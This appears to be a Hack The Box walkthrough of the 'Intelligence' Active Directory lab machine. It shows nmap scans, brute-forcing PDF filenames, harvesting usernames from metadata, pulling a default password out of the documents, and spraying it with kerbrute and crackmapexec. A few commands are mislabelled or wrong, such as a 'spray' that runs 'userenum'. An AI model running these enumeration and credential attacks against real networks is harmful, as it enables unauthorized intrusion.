# Hack the Box - Intelligence

```CSS
Nachine IP: 10.10.10.248
```

## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.248 -T4 --min-rate 1000 -oN nmap.surface

Nmap scan report for 10.10.10.248
Host is up (0.18s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49707/tcp open  unknown
49714/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 304.78 seconds
```

```CSS
▶ nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49707,49714 10.10.10.248 -oN nmap.deep

Nmap scan report for 10.10.10.248                                                                                                                                           
Host is up (0.18s latency).                                                                                                                                                 
                                                                                                                                                                            
PORT      STATE SERVICE       VERSION                                                                                                                                       
53/tcp    open  domain        Simple DNS Plus                                                                                                                               
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                                      
| http-methods:                                                                                                                                                             
|_  Potentially risky methods: TRACE                                                                                                                                        
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                    
|_http-title: Intelligence                                                                                                                                                  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-10 09:15:40Z)                                                                                
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                         
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                 
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)                                           
|_ssl-date: 2023-04-10T09:17:11+00:00; +6h59m58s from scanner time.                                                                                                         
| ssl-cert: Subject: commonName=dc.intelligence.htb                                                                                                                         
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb                                                                         
| Not valid before: 2021-04-19T00:43:16                                                                                                                                     
|_Not valid after:  2022-04-19T00:43:16                                                                                                                                     
445/tcp   open  microsoft-ds?                                                                                                                                               
464/tcp   open  kpasswd5?                                                                                                                                                   
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                           
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)                                           
|_ssl-date: 2023-04-10T09:17:12+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-10T09:17:11+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-10T09:17:12+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-10T09:16:35
|_  start_date: N/A
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.93 seconds
```

---

## HTTP Port #80
  - Homepage
![image](https://user-images.githubusercontent.com/83878909/230812679-60dfc045-321b-4e62-b577-3006e048ab79.png)

  - Announcement Document
![image](https://user-images.githubusercontent.com/83878909/230812932-cad5e527-0fd3-40b5-a09e-62a087f9aebd.png)

  - Other Document
![image](https://user-images.githubusercontent.com/83878909/230813172-f7359efc-a356-4629-9a8a-64564ee6cb07.png)

---

## Brute-Force PDF Filenames
  - Create a wordlist to brute-force the `date`, maybe some other documents exist.
```CSS
▶ for i in $(seq $(date -d "2020-01-01" +%s) 86400 $(date -d "2021-05-15" +%s)); do date -d @$i "+%Y-%m-%d-upload.pdf"; done > files.txt
```
- Brute-Force the filename.
```CSS
▶ for i in $(cat files.txt); do wget http://10.10.10.248/documents/$i; done
```
  - Files found.
![image](https://user-images.githubusercontent.com/83878909/230816862-cc30d963-0b39-4c13-b2cc-7e89e51206b3.png)

---

## Exiftool PDF Meta-data
  - PDF files meta-data.
![image](https://user-images.githubusercontent.com/83878909/230817269-96fbdaa8-e0a4-48e0-b13e-b00ef8405861.png)
  - Extract creator names from meta-dta of all the PDF files.
```CSS
▶ pdf exiftool *pdf | grep Creator | awk '{print $3}' | sort -u > creators.txt
```
```CSS
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

---

## Kerbrute Validate Usernames
```CSS
▶ kerbrute userenum creators.txt --dc 10.10.10.248 -d intelligence.htb
```
![image](https://user-images.githubusercontent.com/83878909/230821076-266f1262-a0a6-4d35-bd21-025be8a3c845.png)

---

## Sensitive Information (Passwords)
  -  Convert all `pdf` files to `text`.
```CSS
▶ for i in $(ls); do pdftotext $i; done
```

  - Passwords
```CSS
▶ cat *.txt | grep -i password -B5 -A5
```
![image](https://user-images.githubusercontent.com/83878909/230822841-3abc40df-e706-4d56-8fbe-1c1b6a0fcab9.png)
  - Password: `NewIntelligenceCorpUser9876`

---

## Kerbrute Password Spray
```
▶ kerbrute userenum creators.txt NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d intelligence.htb -v
```
![image](https://user-images.githubusercontent.com/83878909/230831769-4dfc3fc7-a2ab-4be5-a034-bbb67725fe2b.png)

---

## Attempt Logins
  - SMB Login: Failed
```CSS
▶ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
```
![image](https://user-images.githubusercontent.com/83878909/230832417-7e22c44a-e4b7-4c57-8074-1f134362893b.png)

  - Winrm Login: Failed
```CSS
▶ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
```
![image](https://user-images.githubusercontent.com/83878909/230832825-500c2c4c-c5bc-408f-9054-ff525fc9189e.png)

---

## SMB Shares
  - List SMB Shares
```CSS
▶ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
```
![image](https://user-images.githubusercontent.com/83878909/230832582-d9290c11-90a7-4a0d-bd7a-fafde4a67b18.png)

---

## BloodHound
```CSS
▶ bloodhound-python -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All
```
```CSS
▶ sudo neo4j console
```
```CSS
▶ bloodhound
```
  - Nothing interesting found about user `Tiffany.Molina`.


## Enumerate Other Users on the Domain
```CSS
▶ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --users
```
![image](https://user-images.githubusercontent.com/83878909/230924220-2bff7ab5-7d47-45c4-b392-2d2695d51ad4.png)

